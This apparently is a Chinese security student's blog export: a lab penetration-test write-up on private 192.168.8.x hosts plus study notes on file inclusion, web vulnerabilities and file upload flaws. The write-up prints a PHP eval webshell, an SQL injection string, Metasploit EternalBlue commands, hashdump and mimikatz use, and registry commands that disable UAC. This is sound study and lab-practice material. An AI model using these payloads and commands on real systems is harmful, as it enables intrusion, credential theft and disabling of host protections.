<h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>以防万一，再进行目录扫描<br><img src="https://pic.imgdb.cn/item/657f00bac458853aef167623.jpg"><br>扫出reports目录，看了一下里面的文件，并无利用价值。<br><img src="https://pic.imgdb.cn/item/657f00c6c458853aef16ab5c.jpg"><br>再次以防万一，继续换工具扫<br>发现用dirc、dirsearch、nikto等工具扫还是只有reports这个目录。</p>
<h4 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h4><h5 id="针对80端口"><a href="#针对80端口" class="headerlink" title="针对80端口"></a>针对80端口</h5><p>就是之前的主界面，有三个超链接，前两个是邮箱，点击’here’康康。<br><img src="https://pic.imgdb.cn/item/657f00efc458853aef1758d4.jpg"><br>简单试了一下，存在sql注入。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/657f0100c458853aef17a79e.jpg"><br>试了全部选项，全是类似上面的显示，没啥利用价值。<br>回到之前页面，发现也还是没啥可以点击的</p>
<h5 id="针对22端口"><a href="#针对22端口" class="headerlink" title="针对22端口"></a>针对22端口</h5><p>直接尝试连接</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> root@<span class="number">192.168.8.2</span></span><br></pre></td></tr></table></figure>
<p>需要密码，而且前期我们没有获得任何有价值的信息，先放放。</p>
<h5 id="针对445端口"><a href="#针对445端口" class="headerlink" title="针对445端口"></a>针对445端口</h5><p>由于445端口开启的是SMB共享服务,那么可以有以下思路:<br>使用smbmap对smb信息枚举<br><code>SMBMap允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至远程执行命令。该工具原本的设计初衷是为了简化在大型网络中搜索潜在敏感数据的过程。</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">192.168.8.2</span></span><br></pre></td></tr></table></figure>
<p>发现对共享文件夹reports有读写权限，嘿嘿，这不是一个突破了吗。<br>尝试连接</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">smbclient <span class="regexp">//</span><span class="number">192.168</span>.<span class="number">8.2</span>/reports</span><br></pre></td></tr></table></figure>
<p>密码应该是随便输，我就输入了一个1直接进去了。<br>查看目录，嗯，和我们刚才访问reports目录是一样的内容。<br><img src="https://pic.imgdb.cn/item/657f0115c458853aef18061b.jpg"><br>尝试创建一个目录（没啥用，只是测试是否真的可以写入）<br><img src="https://pic.imgdb.cn/item/657f0135c458853aef189a7e.jpg"><br><img src="https://pic.imgdb.cn/item/657f0148c458853aef18f8ad.jpg"><br>这里成功写入了，我想尝试上传一个后门。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/657f0157c458853aef1953ef.jpg"><br>成功写入！<br><img src="https://pic.imgdb.cn/item/657f0166c458853aef19e893.jpg"><br>尝试蚁剑连接<br><img src="https://pic.imgdb.cn/item/657f0171c458853aef1a1a7f.jpg"><br><img src="https://pic.imgdb.cn/item/657fbe57c458853aefc14cbc.jpg"><br>成功拿下webshell。<br>然后可以提权进入主机权限，再可以提升至root权限，但是查找了很多exp，没有发现可以利用的（待解决）。<br><code>这里其实可以上传一个mimikatz，康康有没有root密码的痕迹</code></p>
<h5 id="关于提权，经过大佬指点，我发现真的好搞笑，我竟然把如此简单的东西整这么复杂！"><a href="#关于提权，经过大佬指点，我发现真的好搞笑，我竟然把如此简单的东西整这么复杂！" class="headerlink" title="关于提权，经过大佬指点，我发现真的好搞笑，我竟然把如此简单的东西整这么复杂！"></a>关于提权，经过大佬指点，我发现真的好搞笑，我竟然把如此简单的东西整这么复杂！</h5><p>直接</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>
<p>列出当前用户可以执行的所有指令<br><img src="https://pic.imgdb.cn/item/65801ecac458853aefc911f3.jpg"><br>靠北，all表示所有指令都可以执行，直接</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo su</span></span><br></pre></td></tr></table></figure>
<p><code>sudo su 是一个 Linux 命令，用于切换当前用户的身份为超级用户（root）。sudo su 允许普通用户临时获得 root 用户的权限，以便执行需要特权访问的操作。su 是切换用户的命令，而 sudo 允许普通用户以超级用户的身份执行特定命令。sudo su 结合了这两个功能，允许用户临时切换为超级用户身份执行命令。</code><br>成功提权。<br><img src="https://pic.imgdb.cn/item/65801ed0c458853aefc9216f.jpg"></p>
<h3 id="192-168-8-60"><a href="#192-168-8-60" class="headerlink" title="192.168.8.60"></a>192.168.8.60</h3><p>现在开始渗透192.168.8.60<br>由于这个是个人主机，开放端口不知道对我们有没有利用价值，先扫为敬。</p>
<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h5><p><code>ps：扫描时，最好养成一个习惯，那就是把扫描结果保存到文件内</code><br>详细服务扫描</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">nmap -<span class="keyword">sT</span> -<span class="keyword">sC</span> -sV -O 192.168.8.60 -<span class="keyword">oN</span> nmapscan/detail</span><br></pre></td></tr></table></figure>
<p>知道一些端口开放信息以及操作系统信息，这里依旧开启了共享文件夹服务。</p>
<p><img src="https://pic.imgdb.cn/item/658028b0c458853aefe76341.jpg"><br>默认脚本扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -script=vuln <span class="number">192.168.8.60</span> -<span class="literal">oN</span> nmapscan/vuln</span><br></pre></td></tr></table></figure>
<p>看得出来，还是利用共享文件夹做文章<br><img src="https://pic.imgdb.cn/item/658028cbc458853aefe7c442.jpg"><br>这里扫出一个smb-vuln-ms10-061，我们查一下是什么。<br><a href="https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-061">https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-061</a><br><img src="https://pic.imgdb.cn/item/658028d6c458853aefe7ed00.jpg"><br><img src="https://pic.imgdb.cn/item/658028e4c458853aefe82a36.jpg"><br>不知道有没有打补丁，我们先尝试利用一下。<br><code>经过尝试，利用不了</code><br>我之前看漏了，这里还存在一个永恒之蓝。</p>
<h5 id="CVE-2017-0143"><a href="#CVE-2017-0143" class="headerlink" title="CVE-2017-0143"></a>CVE-2017-0143</h5><p><code>漏洞原理</code><br>MS17-010漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(Large Non-Paged Kernel Pool)上存在缓冲区溢出。<br>函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小，因计算大小错误，而导致缓冲区溢出。<br>必须：445端口smb服务开启。<br>再三确认，还是使用nessus扫描一下。<br><img src="https://pic.imgdb.cn/item/658028f2c458853aefe89db3.jpg"><br>再用msf的auxiliary模块扫描一下</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="keyword">set</span> rhosts 192.168.8.60</span><br><span class="line"><span class="keyword">run</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6580f165c458853aefcfa358.jpg"><br>证实存在ms17-010，永恒之蓝！！！<br><code>直接开始利用</code><br>查找关于ms17-010的exp（其实poc也会找出来，就是上面的auxiliary模块）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">search</span> ms17-<span class="number">010</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6580f17cc458853aefcfcbb9.jpg"><br>使用框住的exp即可</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.8.60</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.8.128</span><br><span class="line"><span class="comment">#lhost一定要设成kali的ip，不可以使用它默认的127.0.0.1，不然会利用失败，不知道为什么。</span></span><br><span class="line"><span class="built_in">run</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6580f191c458853aefcff0ea.jpg"><br>等待即可。<br>如果成功利用，是以下界面。<br><img src="https://pic.imgdb.cn/item/6580f19ec458853aefd00803.jpg"><br>WIN!<br>getuid直接显示system权限，直接拿到最高权限，攻击成功。</p>
<h1 id="对于ms17-010（deep）"><a href="#对于ms17-010（deep）" class="headerlink" title="对于ms17-010（deep）"></a>对于ms17-010（deep）</h1><p>基于前面我们通过永恒之蓝直接获取了system权限，我们直接开始搞事情。</p>
<h2 id="关闭主机防护策略并开启后门"><a href="#关闭主机防护策略并开启后门" class="headerlink" title="关闭主机防护策略并开启后门"></a>关闭主机防护策略并开启后门</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/121375464">https://blog.csdn.net/dreamthe/article/details/121375464</a></p>
<h3 id="查看用户、密码"><a href="#查看用户、密码" class="headerlink" title="查看用户、密码"></a>查看用户、密码</h3><p>使用hashdump 可以查看用户和密码（虽然是hash值，想要明文的话，康康可不可用hashcat破解一下😟）</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hashdump</span></span><br></pre></td></tr></table></figure>
<p>注:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0为空密码<br><img src="https://pic.imgdb.cn/item/65810d0ec458853aef09da04.jpg"></p>
<h3 id="创建防火墙规则"><a href="#创建防火墙规则" class="headerlink" title="创建防火墙规则"></a>创建防火墙规则</h3><p>ps:在前期端口扫描的时候，发现主机并没有开启防火墙，那这一步就可以跳过。(bushi</p>
<h3 id="关闭UAC"><a href="#关闭UAC" class="headerlink" title="关闭UAC"></a>关闭UAC</h3><p>其原理就是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，已达到帮助阻止恶意程序损坏系统的效果</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65810d27c458853aef0a1215.jpg"></p>
<h3 id="开启默认共享"><a href="#开启默认共享" class="headerlink" title="开启默认共享"></a>开启默认共享</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65810d39c458853aef0a3bc4.jpg"></p>
<h3 id="开启psexec"><a href="#开启psexec" class="headerlink" title="开启psexec"></a>开启psexec</h3><p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开机3389端口，只需要对方开启admin$共享(该共享默认开启)。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于psexec是windows提供的工具，所以杀毒软件会将其添加到白名单中。<br>psexec的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为”PSEXESVC”的二进制文件。然后，通过psexec服务运行命令，运行结束后删除服务。<br>在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。<br><code>前提</code><br>对方主机开启了admin$共享，如果关闭了admin$共享，会提示：找不到网络名<br>如果是工作组环境，则必须使用administrator用户连接，使用普通用户连接会提示：登录失败: 未授予用户在此计算机上的请求登录类型。<br>如果是域环境，连接普通域主机可以用普通域用户，连接域控需要域管理员。<br><code>这里我利用失败了，具体看：</code><a href="https://blog.csdn.net/dreamthe/article/details/121375464">https://blog.csdn.net/dreamthe/article/details/121375464</a><br>但是我上传了一个mimikatz，企图获取密码。<br><img src="https://pic.imgdb.cn/item/65810d45c458853aef0a54c4.jpg"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">upload <span class="regexp">/root/</span>Desktop/mimikatz.exe C:\\windows</span><br></pre></td></tr></table></figure>
<p>但是发现没有保存密码，失败。<br><img src="https://pic.imgdb.cn/item/65810d53c458853aef0a75e3.jpg"></p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2023/10/14/wenjianbaohan/</url>
    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://pic.imgdb.cn/item/652aa816c458853aef587e75.png" alt="图一" title="文件操作之文件包含"><br>参考:<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">https://blog.csdn.net/m0_46467017/article/details/126380415</a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。<br>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。<br>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。<br>简要来说就是将文件以指定脚本类型(根据网站而定)去执行。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">简要案例了解什么是文件包含漏洞:5:00</a></p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>1、本地包含<br>2、远程包含–危害更大<br>两者分别都有两种类型,无限制与有限制。无限制的不必多说,有限制的话就要尝试绕过。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地包含(无限制)小演示:12:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地包含(有限制)小演示:15:00</a><br>本地包含绕过限制:<br>1、%00截断;<br>2、长度截断(文件名后加&#x2F;.或.等)<br><img src="https://pic.imgdb.cn/item/652b45afc458853aef7bd5f7.png" alt="图二" title="本地包含绕过限制"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">远程包含小演示:23:00</a><br>远程包含绕过限制:<br>1、文件名后加%20<br>2、文件名后加%23<br>3、文件名后加?</p>
<h3 id="文件包含漏洞的协议流以及实例"><a href="#文件包含漏洞的协议流以及实例" class="headerlink" title="文件包含漏洞的协议流以及实例"></a>文件包含漏洞的协议流以及实例</h3><p>参考(详细):<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件包含漏洞的各种协议流玩法:28:40(重要)</a><br><img src="https://pic.imgdb.cn/item/6529407fc458853aef03fd17.png" alt="图三" title="限制1"><br><img src="https://pic.imgdb.cn/item/652b45bfc458853aef7c02f6.png" alt="图四" title="限制2"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">CTF题目文件包含讲解(学习思路–重要):39:00</a><br>1、做题时,还是手动去分析,别用扫描工具,真实渗透的情况下可选择使用扫描工具。<br>2、手工看参数值以及功能点尤其重要。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">实战(CMS)黑盒的文件包含漏洞(学习思路–重要):59:00</a><br>1、get一个新思路，如果对方网站的日志能够记录错误请求的代码，而且恰好有文件包含漏洞，那么就可以包含日志文件来执行shell代码。<br>2、文件上传配合文件包含可以起到更大的作用。</p>
<h3 id="文件包含漏洞的修复"><a href="#文件包含漏洞的修复" class="headerlink" title="文件包含漏洞的修复"></a>文件包含漏洞的修复</h3><p>1、固定后缀<br>2、固定文件<br>3、WAF<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=30&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">听思路(个人感觉挺重要):1:08:00</a></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、文件包含漏洞不需要知道路径(也就是目录结构),他会在这个网站的当前目录写入。</p>
]]></content>
      <categories>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>文件操作安全</tag>
      </tags>
  </entry>
  <entry>
    <title>web漏洞必备知识</title>
    <url>/2023/09/20/webLoudongZonghe/</url>
    <content><![CDATA[<h2 id="web漏洞必备知识"><a href="#web漏洞必备知识" class="headerlink" title="web漏洞必备知识"></a>web漏洞必备知识</h2><p>基础名词认识:<a href="https://blog.csdn.net/Spontaneous_0/article/details/129462860">https://blog.csdn.net/Spontaneous_0/article/details/129462860</a></p>
<h3 id="较为重要的web漏洞"><a href="#较为重要的web漏洞" class="headerlink" title="较为重要的web漏洞"></a>较为重要的web漏洞</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">一定要思考漏洞的等级、危害。</span><br><span class="line">高危漏洞：能直接影响到网站权限或数据库权限，就是能够获取数据或直接获取到网站的一些很敏感的东西<span class="comment">(即：</span></span><br><span class="line"><span class="comment">涉及到数据的安全或者权限的丢失)</span>。</span><br><span class="line">低危漏洞：仅仅小部分数据泄漏，数据是网站的一些源码。</span><br></pre></td></tr></table></figure>
<h4 id="1、SQL注入-高危-–数据库操作"><a href="#1、SQL注入-高危-–数据库操作" class="headerlink" title="1、SQL注入(高危)–数据库操作"></a>1、SQL注入(高危)–数据库操作</h4><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">SQL注入漏洞有一些类型可以直接获取网站权限<span class="comment">(直接取得flag)</span>，有一些仅仅获得网站后台权限<span class="comment">(此时SQL仅起辅助作用)</span>，</span><br><span class="line">还需借助其他。</span><br><span class="line">与burp suite抓包结合使用。</span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">SQL注入演示：26:00处</a></p>
<h4 id="2、文件上传-高危"><a href="#2、文件上传-高危" class="headerlink" title="2、文件上传(高危)"></a>2、文件上传(高危)</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">文件上传漏洞大部分可以直接取得网站权限。</span><br><span class="line">还是要利用<span class="keyword">burp </span>suite辅助，首先将后门文件改成<span class="keyword">jpg格式，此时虽然上传了但执行不了，burpsuite抓包后，将这个文件的后缀改回来即可。</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件上传演示：1：07：00处</a></p>
<h4 id="3、xss跨站-中、低危"><a href="#3、xss跨站-中、低危" class="headerlink" title="3、xss跨站(中、低危)"></a>3、xss跨站(中、低危)</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">xss跨站一般获取到的是网站后台权限。</span><br></pre></td></tr></table></figure>
<h4 id="4、文件包含-高危"><a href="#4、文件包含-高危" class="headerlink" title="4、文件包含(高危)"></a>4、文件包含(高危)</h4><h4 id="5、反序列化-中危"><a href="#5、反序列化-中危" class="headerlink" title="5、反序列化(中危)"></a>5、反序列化(中危)</h4><h4 id="6、代码执行-高危"><a href="#6、代码执行-高危" class="headerlink" title="6、代码执行(高危)"></a>6、代码执行(高危)</h4><h4 id="6、逻辑安全-中危"><a href="#6、逻辑安全-中危" class="headerlink" title="6、逻辑安全(中危)"></a>6、逻辑安全(中危)</h4><h4 id="8、未授权访问-高危"><a href="#8、未授权访问-高危" class="headerlink" title="8、未授权访问(高危)"></a>8、未授权访问(高危)</h4><h3 id="遇见较上面七类少"><a href="#遇见较上面七类少" class="headerlink" title="遇见较上面七类少"></a>遇见较上面七类少</h3><h4 id="1、CSRF"><a href="#1、CSRF" class="headerlink" title="1、CSRF"></a>1、CSRF</h4><h4 id="2、SSRF"><a href="#2、SSRF" class="headerlink" title="2、SSRF"></a>2、SSRF</h4><h4 id="3、目录遍历-跨目录文件读取-–源码结构泄漏-获取的是文件夹的内容，不可获取文件的内容"><a href="#3、目录遍历-跨目录文件读取-–源码结构泄漏-获取的是文件夹的内容，不可获取文件的内容" class="headerlink" title="3、目录遍历(跨目录文件读取)–源码结构泄漏,获取的是文件夹的内容，不可获取文件的内容"></a>3、目录遍历(跨目录文件读取)–源码结构泄漏,获取的是文件夹的内容，不可获取文件的内容</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">此漏洞仅仅知识发现目录结构，代码等数据，发现此漏洞并不能对网站造成实际性的危害，要配合</span><br><span class="line">其他。</span><br><span class="line">(dir_list.php是文件名，?后面的title是属性，jarheads.php是属性值)</span><br><span class="line">已知http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/pikachu/</span>vul<span class="regexp">/dir/</span>dir_list.php?title=jarheads.php获取的是</span><br><span class="line">D:\phpstudy_pro\WWW\pikachu\vul\dir\soup\jarheads.php</span><br><span class="line"> 已知http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/pikachu/</span>vul<span class="regexp">/dir/</span>dir_list.php?title=truman.php获取的是</span><br><span class="line">D:\phpstudy_pro\WWW\pikachu\vul\dir\soup\truman.php</span><br><span class="line">那么我若想获取D:\phpstudy_pro\WWW\xx.php应该：http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/pikachu/</span>vul<span class="regexp">/dir/</span>dir_list.php?title=..<span class="regexp">/../</span>..<span class="regexp">/../</span>xx.php</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">问题：我该如何知道这个网站有这个目录这个文件？</span><br><span class="line">答：爆破，网站目录爬行，查看页面源码。</span><br></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">目录遍历演示：41:00处</a></p>
<h4 id="4、文件读取–源码内容泄漏，仅仅获取单个文件"><a href="#4、文件读取–源码内容泄漏，仅仅获取单个文件" class="headerlink" title="4、文件读取–源码内容泄漏，仅仅获取单个文件"></a>4、文件读取–源码内容泄漏，仅仅获取单个文件</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">在目录遍历的基础下，知道了文件夹内部的结构，方便读取单个文件的内容。</span><br></pre></td></tr></table></figure>
<h4 id="5、xxe安全"><a href="#5、xxe安全" class="headerlink" title="5、xxe安全"></a>5、xxe安全</h4><h4 id="6、命令执行-高危"><a href="#6、命令执行-高危" class="headerlink" title="6、命令执行(高危)"></a>6、命令执行(高危)</h4><h4 id="7、文件下载"><a href="#7、文件下载" class="headerlink" title="7、文件下载"></a>7、文件下载</h4><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=10&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">文件下载演示：1:27：00处</a></p>
<h4 id="8、其他"><a href="#8、其他" class="headerlink" title="8、其他"></a>8、其他</h4>]]></content>
      <categories>
        <category>web漏洞知识</category>
      </categories>
      <tags>
        <tag>web漏洞知识</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传基础</title>
    <url>/2023/10/04/wenjianshangchuan1/</url>
    <content><![CDATA[<h2 id="文件上传基础"><a href="#文件上传基础" class="headerlink" title="文件上传基础"></a>文件上传基础</h2><p><img src="https://pic.imgdb.cn/item/6522b4f3c458853aeffd89f5.png" alt="文件上传基础" title="文件上传基础"><br><img src="https://pic.imgdb.cn/item/6522b55dc458853aeffd9af0.png" alt="文件上传种类" title="文件上传种类"></p>
<h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞?"></a>什么是文件上传漏洞?</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">文件上传漏洞是web安全中经常用到的一种漏洞形式。是对数据与代码分离原则的一种攻击。</span><br><span class="line">上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell</span><br><span class="line">等到服务器执行，并最终获得网站控制权限的高危漏洞。</span><br></pre></td></tr></table></figure>
<p>有两个注意的地方:<br>1、若存在文件上传的功能,则可以测试其是否存在文件上传的漏洞。<br>2、但同时,若存在文件上传的功能,我们可以测试其是否存在文件上传漏洞。</p>
<h3 id="文件上传漏洞有哪些危害"><a href="#文件上传漏洞有哪些危害" class="headerlink" title="文件上传漏洞有哪些危害?"></a>文件上传漏洞有哪些危害?</h3><p>高危漏洞,若上传一个后门文件(webshell),则可以直接获取到当前网站的权限。</p>
<h3 id="文件上传漏洞如何查找及判断"><a href="#文件上传漏洞如何查找及判断" class="headerlink" title="文件上传漏洞如何查找及判断?"></a>文件上传漏洞如何查找及判断?</h3><p>查找:<br>1、黑盒查找：<br>   暴力方法,通过一些软件进行目录扫描<br>   通过会员中心上传头像之类的<br>   通过后台权限获取网站权限<br>2、白盒查找:拿到代码,分析代码。<br>判断:自己抓包测试。<br>需要注意的地方：判断上传漏洞的类型。</p>
<h3 id="一些文件上传漏洞相关演示"><a href="#一些文件上传漏洞相关演示" class="headerlink" title="一些文件上传漏洞相关演示"></a>一些文件上传漏洞相关演示</h3><p>1、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">常规文件上传地址的获取说明(怎么发现文件上传漏洞,如何突破):18:15</a><br>2、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">不同格式下的文件类型后门测试(重要):24:20</a><br>3、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">配合解析漏洞下的文件类型后门测试(可以学习一下使用vulhub):30:00</a></p>
<figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line">这个演示本质是php <span class="built_in">CGI</span>漏洞，由于有些php版本默认开启cgi.fi选项，php遇到不存在文件时会向前递归解析，</span><br><span class="line">与nginx配合会造成该漏洞。即虽然是png图片格式,但是由于这个解析漏洞,在路径后面加上一个此目录不存在的</span><br><span class="line">一个php文件,那么隐藏在图片内的代码会被执行(可以实现反逆转)。</span><br></pre></td></tr></table></figure>
<p>4、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">迪师傅对于2、3的拓展:41:25</a><br>5、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地文件上传漏洞靶场环境搭建测试(前端验证):46:35</a><br>!!!文件上传漏洞的靶场(自己搭建):<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a><br>对于实例五的思考:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">前端<span class="comment">(html,js)</span>负责显示传输数据,后端<span class="comment">(php,py)</span>负责接受和处理数据，数据库负责保存数据。</span><br><span class="line">前端验证就是在你自己的本地浏览器上即可验证。</span><br><span class="line">后端验证则是发送到服务器端脚本去验证判断。</span><br><span class="line"><span class="comment">(前端先验证再发给后端和发过去给后端验证的区别。)</span></span><br><span class="line">也就是说,前端验证不安全,用户可以通过禁用script脚本<span class="comment">(或者把源代码copy下来</span></span><br><span class="line"><span class="comment">把过滤代码删除)</span>来实现绕过。</span><br><span class="line">而后端验证相对来说较为安全。</span><br></pre></td></tr></table></figure>
<p>!!!若用js方式实现文件上传操作(上传到前端,没有交互),那么抓包可能抓不到,也就实现不了burp抓包改后缀的操作。<br>6、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=19&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">某CMS文件上传漏洞测试:1:06:00</a></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">若在本地测试发现不了上传漏洞,并不是说就没有上传漏洞。</span><br><span class="line">你可以通过cms识别出网站使用什么系统搭建的<span class="comment">(视频中的是findcms)</span>,通过上网搜索相关漏洞实现文件上传。</span><br></pre></td></tr></table></figure>
